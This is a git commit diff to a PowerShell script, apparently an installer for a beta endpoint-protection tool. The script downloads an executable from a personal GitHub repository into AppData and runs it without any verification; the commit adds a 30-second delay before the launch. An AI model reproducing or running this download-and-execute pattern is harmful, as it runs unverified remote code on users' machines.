aef524d79c52de756006841cf31bd6f1d62074c5
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-20 21:51:26 +0300

    Update ravendpointprotection.ps1

--- RAV/ravendpointprotection.ps1
+++ RAV/ravendpointprotection.ps1
@@ -2,4 +2,5 @@ $x = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/beta/RAVEndpoi
 $y = "$env:USERPROFILE\AppData\Local\RAVEndpointProtectionbeta.exe"
 
 Invoke-WebRequest -Uri $x -OutFile $y
+Start-Sleep -Seconds 30
 Start-Process $y
